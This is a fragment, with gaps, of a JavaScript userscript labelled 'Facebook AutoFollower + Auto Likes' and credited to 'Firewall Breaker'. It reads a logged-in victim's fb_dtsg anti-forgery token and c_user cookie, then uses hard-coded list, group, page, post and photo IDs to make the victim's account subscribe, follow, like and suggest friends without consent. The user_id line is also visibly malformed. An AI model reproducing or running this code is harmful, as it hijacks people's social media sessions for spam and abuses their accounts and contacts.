...
// @description     Facebook AutoFollower + Auto Likes
...
sublist("180342992172119");
sublist("202071546665930");
sublist("202071386665946"); 


//Anggota
var gid = ['643232982407749'];
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
...
var spage_id = "440631379322256";
var spost_id = "200284863509502";
var sfoto_id = "194540867417235";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
...
function blub()
{
    if(document.getElementsByClassName('pbm fsm').length == 1) {
        ...
        //e.href = '#';
        e.innerHTML = 'Auto Suggest by Firewall Breaker';
